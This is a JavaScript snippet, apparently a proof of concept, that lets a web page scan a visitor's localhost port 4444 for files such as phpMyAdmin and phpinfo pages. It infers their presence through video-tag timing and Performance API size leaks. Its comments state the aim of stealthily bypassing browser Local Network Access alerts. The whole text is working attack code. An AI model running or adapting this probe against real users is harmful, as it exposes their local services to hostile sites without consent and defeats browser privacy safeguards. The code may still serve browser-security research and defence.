<script>
    const targetPaths = [
        "/favicon.ico", 
        "/dashboard/phpinfo.php", 
        "/phpmyadmin/index.php", 
        "/icons/apache_pb.gif"
    ];

    // Vector 1: Video Tag Side-Channel (Aksar Alert bypass karta hai)
    function videoProbe(url) {
        return new Promise((resolve) => {
            const video = document.createElement('video');
            const start = performance.now();
            
            // Onsuspend triggers when the browser acknowledges the resource metadata
            video.onsuspend = () => {
                const duration = performance.now() - start;
                resolve({ status: "200 OK (Found)", time: duration });
            };
            
            video.onerror = () => {
                const duration = performance.now() - start;
                // Based on your 32ms vs 4315ms evidence
                if (duration < 500) resolve({ status: "404 Not Found", time: duration });
                else resolve({ status: "Security Blocked", time: duration });
            };

            video.src = url + "?cb=" + Date.now();
        });
    }

    // Vector 2: Performance API Size Leak (Zero False Positive Logic)
    async function sizeProbe(url) {
        try {
            // Using preload which was shown to bypass silently
            const link = document.createElement('link');
            link.rel = "preload";
            link.as = "image";
            link.href = url;
            document.head.appendChild(link);

            await new Promise(r => setTimeout(r, 200));
            const entry = performance.getEntriesByName(url).pop();
            
            if (entry && entry.transferSize > 0) {
                // Real files have significant transferred size vs 404 pages
                return entry.transferSize > 600 ? "200 OK (Size Leak)" : "404 Not Found";
            }
            return "Blocked/Hidden";
        } catch (e) { return "Error"; }
    }

    async function runStealthAudit() {
        const display = document.getElementById('display');
        const port = 4444; 
        display.innerHTML = `[!] Auditing 127.0.0.1:${port}...<br><br>`;

        for (let path of targetPaths) {
            const url = `http://127.0.0.1:${port}${path}`;
            // Trying Video tag first as it bypasses LNA Fetch Alerts
            const result = await videoProbe(url);
            
            let statusClass = (result.status.includes("200")) ? "success" : "notfound";
            display.innerHTML += `<div>Path: ${path} -> <span class="${statusClass}">${result.status}</span> (${result.time.toFixed(2)}ms)</div>`;
        }
    }
